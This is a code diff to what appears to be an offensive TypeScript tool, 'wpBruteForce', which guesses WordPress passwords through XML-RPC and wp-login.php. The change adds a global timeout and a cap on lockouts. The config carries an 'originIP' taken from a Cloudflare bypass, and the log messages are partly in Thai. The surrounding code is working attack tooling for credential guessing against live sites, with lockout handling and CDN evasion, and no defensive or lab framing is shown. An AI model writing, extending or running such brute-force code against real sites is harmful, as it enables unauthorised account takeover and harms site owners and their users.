@@ -47,6 +47,8 @@ export interface BruteForceConfig {
   maxAttempts?: number;        // default 50
   delayBetweenAttempts?: number; // ms, default 1000
   lockoutDelay?: number;       // ms, default 30000
+  maxLockouts?: number;        // max lockout count before abort, default 3
+  globalTimeout?: number;      // ms, max total time for brute force, default 120000 (2min)
   customUsernames?: string[];
   customPasswords?: string[];
   originIP?: string;           // ถ้ามี origin IP จาก CF bypass
@@ -298,6 +300,10 @@ export async function wpBruteForce(config: BruteForceConfig): Promise<BruteForce
   const maxAttempts = config.maxAttempts || 50;
   const delayMs = config.delayBetweenAttempts || 1000;
   const lockoutDelay = config.lockoutDelay || 30000;
+  const maxLockouts = config.maxLockouts || 3;
+  const globalTimeout = config.globalTimeout || 120000; // 2 min
+  let lockoutCount = 0;
+  const deadline = Date.now() + globalTimeout;
 
   const result: BruteForceResult = {
     success: false,
@@ -360,8 +366,19 @@ export async function wpBruteForce(config: BruteForceConfig): Promise<BruteForce
           log(`⚠️ ถึง max attempts (${maxAttempts})`);
           break;
         }
+        if (Date.now() > deadline) {
+          log(`⏰ Global timeout (${globalTimeout / 1000}s) — abort brute force`);
+          result.errors.push('global_timeout');
+          break;
+        }
         if (result.lockedOut) {
-          log(`⏳ Locked out — รอ ${lockoutDelay / 1000}s...`);
+          lockoutCount++;
+          if (lockoutCount >= maxLockouts) {
+            log(`🚫 Max lockouts (${maxLockouts}) reached — abort brute force`);
+            result.errors.push('max_lockouts_reached');
+            break;
+          }
+          log(`⏳ Locked out (${lockoutCount}/${maxLockouts}) — รอ ${lockoutDelay / 1000}s...`);
           await sleep(lockoutDelay);
           result.lockedOut = false;
         }
@@ -394,21 +411,32 @@ export async function wpBruteForce(config: BruteForceConfig): Promise<BruteForce
 
         if (delayMs > 0) await sleep(delayMs);
       }
-      if (result.attemptsMade >= maxAttempts) break;
+      if (result.attemptsMade >= maxAttempts || Date.now() > deadline || lockoutCount >= maxLockouts) break;
     }
   } else {
     log("XMLRPC not available — ใช้ wp-login.php");
   }
 
   // Phase 3: Try wp-login.php (if XMLRPC failed)
-  if (!result.success && result.attemptsMade < maxAttempts) {
+  if (!result.success && result.attemptsMade < maxAttempts && Date.now() < deadline && lockoutCount < maxLockouts) {
     log("Phase 3: ลอง wp-login.php brute force...");
     
     for (const username of allUsernames) {
       for (const password of allPasswords) {
         if (result.attemptsMade >= maxAttempts) break;
+        if (Date.now() > deadline) {
+          log(`⏰ Global timeout (${globalTimeout / 1000}s) — abort brute force`);
+          result.errors.push('global_timeout');
+          break;
+        }
         if (result.lockedOut) {
-          log(`⏳ Locked out — รอ ${lockoutDelay / 1000}s...`);
+          lockoutCount++;
+          if (lockoutCount >= maxLockouts) {
+            log(`🚫 Max lockouts (${maxLockouts}) reached — abort brute force`);
+            result.errors.push('max_lockouts_reached');
+            break;
+          }
+          log(`⏳ Locked out (${lockoutCount}/${maxLockouts}) — รอ ${lockoutDelay / 1000}s...`);
           await sleep(lockoutDelay);
           result.lockedOut = false;
         }
@@ -435,7 +463,7 @@ export async function wpBruteForce(config: BruteForceConfig): Promise<BruteForce
 
         if (delayMs > 0) await sleep(delayMs);
       }
-      if (result.attemptsMade >= maxAttempts) break;
+      if (result.attemptsMade >= maxAttempts || Date.now() > deadline || lockoutCount >= maxLockouts) break;
     }
   }
 
